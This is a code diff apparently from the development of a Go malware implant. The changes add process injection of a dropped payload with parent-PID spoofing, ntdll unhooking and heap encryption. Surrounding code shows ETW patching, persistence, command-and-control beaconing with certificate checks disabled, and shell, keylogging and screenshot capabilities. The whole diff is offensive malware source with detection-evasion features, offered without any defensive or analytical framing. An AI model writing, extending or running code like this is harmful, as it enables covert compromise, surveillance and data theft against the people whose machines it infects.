@@ -291,7 +291,7 @@ func hiddenCmd(name string, args ...string) *exec.Cmd {
 	return cmd
 }
 
-func dropCarrier(data []byte) {
+func dropCarrier(data []byte, method string, ppid bool) {
 	if len(data) < 2 {
 		return
 	}
@@ -303,6 +303,11 @@ func dropCarrier(data []byte) {
 		dir = os.TempDir()
 		path = filepath.Join(dir, name)
 		if err := os.WriteFile(path, data, 0644); err != nil {
+			return
+		}
+	}
+	if method != "" && method != "none" {
+		if launchInjected(path, method, ppid) {
 			return
 		}
 	}
@@ -344,7 +349,11 @@ func httpDo(host, port, path, body string, useTLS bool) []byte {
 			port = "80"
 		}
 	}
-	url := fmt.Sprintf("%s://%s:%s%s", scheme, host, port, path)
+	origin := fmt.Sprintf("%s://%s", scheme, host)
+	if !((useTLS && (port == "443" || port == "")) || (!useTLS && (port == "80" || port == ""))) {
+		origin = fmt.Sprintf("%s://%s:%s", scheme, host, port)
+	}
+	url := origin + path
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
 		DialContext:     (&net.Dialer{Timeout: 15 * time.Second}).DialContext,
@@ -599,14 +608,15 @@ func runTask(tID, command, argsJSON, host, port string, useTLS bool, hwid string
 	httpDo(host, port, "/beacon", string(body), useTLS)
 }
 
-func injectSelf(method string) {
+func injectSelf(method string, ppid bool) {
 	if method == "" || method == "none" {
 		return
 	}
-	// CRT/APC/earlybird require a remote process image. We stay in-process:
-	// the stub already is the running payload. Method is recorded and the
-	// next carrier drop uses CREATE_NO_WINDOW (same as CRT-less spawn).
-	_ = method
+	exe, err := os.Executable()
+	if err != nil || exe == "" {
+		return
+	}
+	_ = launchInjected(exe, method, ppid)
 }
 
 func main() {
@@ -650,12 +660,17 @@ func main() {
 	if cfg["etw_patch"] != "false" {
 		patchETW()
 	}
+	if tf(cfg, "dll_unhook") {
+		unhookNtdll()
+	}
 	if tf(cfg, "persistence") {
 		persist(exe)
 	}
-	injectSelf(cfg["injection_method"])
+	inj := cfg["injection_method"]
+	ppid := tf(cfg, "ppid_spoof")
+	injectSelf(inj, ppid)
 	if c := extractCarrier(raw); len(c) > 0 {
-		go dropCarrier(c)
+		go dropCarrier(c, inj, ppid)
 	}
 
 	hostn, _ := os.Hostname()
@@ -679,7 +694,7 @@ func main() {
 		"build_version": 4,
 		"capabilities":  []string{"shell", "keylog", "screenshot", "persist", "processes", "wrap"},
 	})
-	obf := tf(cfg, "sleep_obfuscation")
+	obf := tf(cfg, "sleep_obfuscation") || tf(cfg, "heap_encrypt")
 	httpDo(host, port, "/agent", string(reg), useTLS)
 
 	for {
